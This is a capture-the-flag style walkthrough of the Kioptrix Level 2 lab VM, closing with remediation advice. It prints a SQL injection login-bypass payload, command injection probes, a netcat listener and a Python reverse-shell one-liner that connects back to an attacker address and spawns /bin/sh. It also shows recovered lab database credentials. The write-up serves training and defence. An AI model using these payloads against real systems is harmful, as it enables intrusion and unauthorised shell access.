# Kioptrix: Level 2 — Walkthrough

A penetration testing walkthrough of the Kioptrix Level 2 boot2root VM, covering host discovery, enumeration, web application exploitation, and privilege escalation to root.

## Table of Contents

- [Host Discovery](#host-discovery)
- [Nmap Scan](#nmap-scan)
- [Port 22 (SSH)](#port-22-ssh)
- [Port 80 (HTTP)](#port-80-http)
- [SQL Injection — Authentication Bypass](#sql-injection--authentication-bypass)
- [Command Injection & Reverse Shell](#command-injection--reverse-shell)
- [Database Credential Recovery](#database-credential-recovery)
- [Privilege Escalation](#privilege-escalation)
- [Remediation](#remediation)

## Host Discovery

The target was identified on the local subnet using `netdiscover`:

```bash
netdiscover -r 192.168.100.0/24
```

**Vulnerable host:** `192.168.100.11`
<img width="1280" height="185" alt="image1" src="https://github.com/user-attachments/assets/03dc4b7a-6c55-4b0a-858f-7ccd7302771a" />

## Nmap Scan

An Nmap scan was run against the target to enumerate open ports and services.

<img width="1280" height="481" alt="image2" src="https://github.com/user-attachments/assets/aeae76b9-c3c6-4f89-b1b6-d6fbb8b3ea18" />
<img width="1280" height="311" alt="image3" src="https://github.com/user-attachments/assets/aaf4c984-0405-4743-a874-2907ce640d0f" />
<img width="1280" height="150" alt="image4" src="https://github.com/user-attachments/assets/9b59240d-7e22-4657-a48c-04b645b22c7a" />
<img width="1280" height="375" alt="image5" src="https://github.com/user-attachments/assets/b627c978-32cd-498f-b0c2-5016d45cfc87" />
<img width="1280" height="618" alt="image6" src="https://github.com/user-attachments/assets/13fcab89-45c3-4ae4-aebe-5f168e407cb0" />
<img width="1280" height="440" alt="image7" src="https://github.com/user-attachments/assets/1caa4e0c-c0d1-4280-9481-3ab64f9b82b8" />
<img width="1280" height="210" alt="image8" src="https://github.com/user-attachments/assets/6fbbc4be-828c-46f8-890a-31b32120ad52" />

## Port 22 (SSH)

Flagged as a **false positive** — not pursued further.

## Port 80 (HTTP)

Directory and file enumeration was performed with `ffuf`:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.100.11/FUZZ -v -e ".html,.txt,.php"
```

<img width="1280" height="376" alt="image9" src="https://github.com/user-attachments/assets/1f14654b-1885-4e59-af83-359809714c1c" />
<img width="1280" height="621" alt="image10" src="https://github.com/user-attachments/assets/2b33c20a-18a3-427c-808a-8d5796eac77c" />

The `/manual` path pointed to the default Apache manual documentation. The `index.php` endpoint looked more promising, so I visited next.

<img width="1282" height="253" alt="image11" src="https://github.com/user-attachments/assets/40c4851f-77ad-4b4c-aae0-6980acf1e42f" />


## SQL Injection — Authentication Bypass

The `index.php` page presented a login form. It was tested for SQL injection as a means of bypassing authentication:

**Payload used:**

| Field | Value |
|---|---|
| Username | `' OR '1'='1` |
| Password | `' OR '1'='1` |

<img width="1282" height="253" alt="image12" src="https://github.com/user-attachments/assets/95573ee4-044c-4145-baba-e6802d60202b" />

This successfully bypassed the authentication mechanism and granted access to the web application.

<img width="1022" height="416" alt="image13" src="https://github.com/user-attachments/assets/7884dda6-cd36-4f6d-84a8-b58a73852c63" />


## Command Injection & Reverse Shell

With access to the application, command injection was tested:

```bash
`id`
;id
```

<img width="1022" height="416" alt="image14" src="https://github.com/user-attachments/assets/ddde7de0-9863-458e-b141-e3f52c5079df" />
<img width="1282" height="455" alt="image15" src="https://github.com/user-attachments/assets/94acede5-0797-4cc6-962d-1c07f1de3a2e" />

Confirming command injection, a Netcat listener was set up to catch a reverse shell:

```bash
nc -lvnp 4444
```

The following Python one-liner was then submitted through the vulnerable field to trigger a reverse shell back to the listener:

```bash
;python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.1.1",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

<img width="1274" height="416" alt="image16" src="https://github.com/user-attachments/assets/4e3d8cb6-f15a-4d25-bb8a-3a985164e74e" />


After submission, a shell was received on the listener:

<img width="1274" height="416" alt="image17" src="https://github.com/user-attachments/assets/bd4d22d0-f5c9-464b-b650-acd896c9995a" />


## Database Credential Recovery

To recover the application's database credentials, `index.php` was read directly from the reverse shell:

```bash
cat index.php
```

<img width="1274" height="709" alt="image18" src="https://github.com/user-attachments/assets/aec283ad-fd3c-46b9-b696-e3ef20754f6d" />


**Recovered credentials:**

| Field | Value |
|---|---|
| Username | `john` |
| Password | `Hiroshima` |

These credentials were then used to access the MySQL database:

<img width="1274" height="175" alt="image19" src="https://github.com/user-attachments/assets/efdfc900-59de-49f5-b839-542f31f97a43" />
<img width="1274" height="200" alt="image20" src="https://github.com/user-attachments/assets/7160f33a-8fac-4e8c-a887-154029b6b366" />
<img width="1274" height="268" alt="image21" src="https://github.com/user-attachments/assets/4576b600-7269-4149-a8da-844ace30389e" />
<img width="1274" height="191" alt="image22" src="https://github.com/user-attachments/assets/a7f5786d-e9c2-4217-9270-1759de58d49e" />

## Privilege Escalation

The target's kernel and OS version were fingerprinted to identify a suitable privilege escalation path:

```bash
uname -a; lsb_release -a
```

<img width="1274" height="202" alt="image23" src="https://github.com/user-attachments/assets/9e8b601c-57c3-49d1-8c19-044148269373" />


**Result:** Linux kernel 2.6.9, CentOS v4.5 — vulnerable to a known local kernel exploit.

<img width="1274" height="782" alt="image24" src="https://github.com/user-attachments/assets/e4cd1bb4-943d-472a-8564-65cb57c9820f" />
<img width="1274" height="203" alt="image25" src="https://github.com/user-attachments/assets/d43e6924-4663-4537-8a71-c10aec2e3f58" />

The exploit was transferred to the target by hosting it on a simple local web server and downloading it from the reverse shell:

<img width="1274" height="125" alt="image26" src="https://github.com/user-attachments/assets/81982dc9-1ad1-4916-abc6-cf7f0f31ecbc" />
<img width="1274" height="246" alt="image27" src="https://github.com/user-attachments/assets/68d16f71-1e13-4d89-ad7f-ef832d5868db" />

The exploit was then compiled on the target, made executable, and run:

<img width="1274" height="111" alt="image28" src="https://github.com/user-attachments/assets/24f430b9-72b9-4c56-9389-b965c6814040" />


Root privileges were confirmed after execution:

<img width="1274" height="127" alt="image29" src="https://github.com/user-attachments/assets/857bf4ab-f59e-46e5-9145-1201cd9d4920" />


## Port 631

Flagged as a **false positive** — not pursued further.

## Port 3306 (mySQL)

Proof of **presence of a Database**.


# Remediation
## SQL Injection (Authentication Bypass)
* Use parameterized queries / prepared statements for all database calls — never concatenate user input into SQL strings.
* Apply an ORM or a vetted database abstraction layer that enforces parameterization by default.
* Validate and sanitize all user input server-side; reject unexpected characters in login fields.
* Enforce least-privilege database accounts so a compromised web app account can't read arbitrary tables.

## Command Injection
* Never pass user-supplied input directly to shell commands (system(), exec(), backticks, etc.).
* If shelling out is unavoidable, use safe APIs that separate arguments from commands (e.g., execve-style calls with an argument array) rather than a single interpolated string.
* Apply strict allow-list input validation on any field that reaches system-level functionality.
* Run the web service under a low-privilege, sandboxed account (chroot/containers) to limit blast radius if injection does occur.

## Hardcoded / Weak Database Credentials in Source
* Never store database credentials in application source files (e.g., index.php); use environment variables or a secrets manager.
* Enforce strong, unique passwords for all database accounts — rotate immediately after any suspected exposure.
* Restrict MySQL user privileges to only what the application needs (no FILE, no cross-database access).
* Disable remote root login to MySQL and bind it to localhost where possible.

## Outdated Kernel / OS (Linux 2.6.9, CentOS 4.5) — Privilege Escalation
* Patch and upgrade to a currently supported OS/kernel version; EOL systems no longer receive security fixes.
* Establish a regular patch management cycle and track CVEs for the deployed kernel version.
* Apply kernel hardening controls (e.g., SELinux/AppArmor enforcing mode, restricted ptrace, ASLR) to reduce exploitability even on unpatched systems.
* Remove or restrict compiler toolchains (e.g., gcc) on production servers so downloaded exploits can't be compiled locally.
